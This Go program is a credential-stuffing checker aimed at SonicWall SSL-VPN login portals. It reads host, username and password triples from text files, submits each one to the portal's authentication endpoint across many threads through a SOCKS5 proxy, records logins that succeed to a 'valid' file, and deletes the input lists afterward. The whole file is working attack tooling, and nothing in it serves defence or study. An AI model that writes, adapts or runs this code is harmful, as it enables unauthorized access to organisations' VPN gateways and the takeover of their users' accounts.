//go:build ignore

package main

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

var (
	fileDir     = "/root/NAM/Check"
	validDir    = "/root/NAM/Servis"
	validFile   = filepath.Join(validDir, "valid.txt")
	proxyConfig = filepath.Join(validDir, "proxy_config.txt")
)

type config struct {
	Threads int
}

func readConfig(path string) config {
	cfg := config{Threads: 100}
	f, err := os.Open(path)
	if err != nil {
		return cfg
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, "threads") {
			fmt.Sscanf(line, "threads=%d", &cfg.Threads)
		}
	}
	return cfg
}

func readProxy(path string) string {
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(data))
}

func checkProxy(client *http.Client) bool {
	resp, err := client.Get("https://httpbin.org/ip")
	if err != nil {
		return false
	}
	resp.Body.Close()
	return resp.StatusCode == 200
}

func appendValid(line string) {
	f, err := os.OpenFile(validFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
	if err == nil {
		defer f.Close()
		io.WriteString(f, line+"\n")
	}
}

func worker(client *http.Client, jobs <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	for line := range jobs {
		parts := strings.Split(line, ";")
		if len(parts) < 3 {
			continue
		}
		url := fmt.Sprintf("https://%s/p/u/doAuthentication.do", strings.TrimSpace(parts[0]))
		form := "login=" + parts[1] + "&passwd=" + strings.TrimSpace(parts[2]) + "&savecredentials=false&nsg-x1-logon-button=Log On&StateContext=bG9naW5zY2hlbWE9ZGVmYXVsdA%3D%3D"
		req, _ := http.NewRequest("POST", url, strings.NewReader(form))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err := client.Do(req)
		if err == nil {
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			if strings.Contains(string(body), "<CredentialUpdateService>/p/a/getCredentialUpdateRequirements.do</CredentialUpdateService>") {
				fmt.Printf("[SonicWall] %s is valid\n", line)
				appendValid(line)
			} else {
				fmt.Printf("[SonicWall] %s is invalid\n", line)
			}
		} else {
			fmt.Printf("[SonicWall] error for %s: %v\n", line, err)
		}
	}
}

func main() {
	cfg := readConfig("config.txt")
	fmt.Printf("[SonicWall] Using %d threads.\n", cfg.Threads)

	os.MkdirAll(fileDir, os.ModePerm)
	os.MkdirAll(validDir, os.ModePerm)

	proxyInfo := readProxy(proxyConfig)
	parts := strings.Split(proxyInfo, ":")
	if len(parts) != 4 {
		fmt.Println("[SonicWall] invalid proxy config")
		return
	}
	dialerAuth := &proxy.Auth{User: parts[2], Password: parts[3]}
	dialer, err := proxy.SOCKS5("tcp", parts[0]+":"+parts[1], dialerAuth, proxy.Direct)
	if err != nil {
		fmt.Printf("proxy dialer error: %v\n", err)
		return
	}

	httpTransport := &http.Transport{}
	httpTransport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		return dialer.Dial(network, addr)
	}

	client := &http.Client{Transport: httpTransport, Timeout: 10 * time.Second}
	if !checkProxy(client) {
		fmt.Println("[SonicWall] proxy check failed")
		return
	}

	files, _ := filepath.Glob(filepath.Join(fileDir, "*.txt"))
	jobs := make(chan string, cfg.Threads)
	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go worker(client, jobs, &wg)
	}

	for _, fp := range files {
		f, err := os.Open(fp)
		if err != nil {
			continue
		}
		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			jobs <- line
		}
		f.Close()
		os.Remove(fp)
		fmt.Printf("[SonicWall] File %s processed\n", fp)
	}

	close(jobs)
	wg.Wait()
}
